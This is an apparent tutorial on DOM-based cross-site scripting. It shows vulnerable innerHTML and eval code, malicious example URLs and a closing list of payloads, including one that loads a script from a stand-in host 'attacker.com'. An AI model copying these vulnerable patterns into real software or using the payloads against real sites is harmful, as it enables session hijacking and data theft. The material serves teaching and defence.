In a **DOM-based XSS attack**, the injected script does not come from the server’s response (like reflected or stored XSS). Instead, the malicious code is embedded in the URL or another part of the client-side input, and JavaScript running on the page dynamically processes this data and performs unsafe DOM manipulation. This type of attack can allow an attacker to execute arbitrary JavaScript within the victim's browser, leading to the compromise of sensitive data.

---

## How Does DOM-based XSS Work?

1. **User Input**: The attacker crafts a malicious URL or modifies an existing URL to include the malicious JavaScript payload (e.g., through query parameters, hashes, or other client-side input sources).
2. **Client-Side Execution**: When the user clicks the malicious link, the client-side JavaScript (running in the victim's browser) processes the input and directly manipulates the DOM without proper sanitization or escaping of the malicious code.
3. **Script Execution**: The injected payload is executed in the victim’s browser, often leading to data theft (like cookies), session hijacking, or other malicious behavior.

#### Examples

###### innerHTML
Consider a website that has a JavaScript function that uses user input directly from the URL query parameters to display content dynamically.

For example, the site may take the `name` parameter from the URL and display it on the page:

```javascript
// Example of vulnerable client-side code
let name = new URLSearchParams(window.location.search).get('name');
document.getElementById('greeting').innerHTML = 'Hello, ' + name;
```

**Malicious URL**
An attacker could craft a URL like this:
```jaavascript
http://example.com/?name=<script>alert('DOM-based XSS')</script>
```

When the victim clicks the link, the JavaScript code directly places the content from the `name` parameter into the HTML without any sanitization. As a result, the malicious script is executed, and an alert is shown with the message "DOM-based XSS."

###### eval
Imagine a website that lets users perform quick calculations directly through the URL. The developer might use `eval()` to evaluate math expressions:

```javascript
let expression = new URLSearchParams(window.location.search).get('calc');
let result = eval(expression);
alert('Result: ' + result);
```

If the user visits:

```
http://example.com/?calc=2+3*4
```

The site shows an alert with the result: `Result: 14`.

However, an attacker could abuse this by injecting malicious code:

```
http://example.com/?calc=alert('XSS')
```

This would trigger a popup saying "**XSS**".

---

## Common JavaScript Functions Vulnerable to DOM-based XSS

- `innerHTML`
- `document.write()`
- `eval()`
- `setTimeout()` or `setInterval()`
- `location.hash`
- `document.referrer`

---

## Example Payloads for DOM-based XSS

Here are some common payloads that could be used in DOM-based XSS attacks:

1. **Injection via URL parameters**:
```html
http://example.com/?param=<script>alert('XSS')</script>
```

2. **DOM Manipulation via `innerHTML`**:
```html
<img src="invalid" onerror="alert('XSS')">
```

3. **Cross-Domain Script Inclusion**:
```html
<script>
  var script = document.createElement('script');
  script.src = 'http://attacker.com/malicious.js';
  document.body.appendChild(script);
</script>
```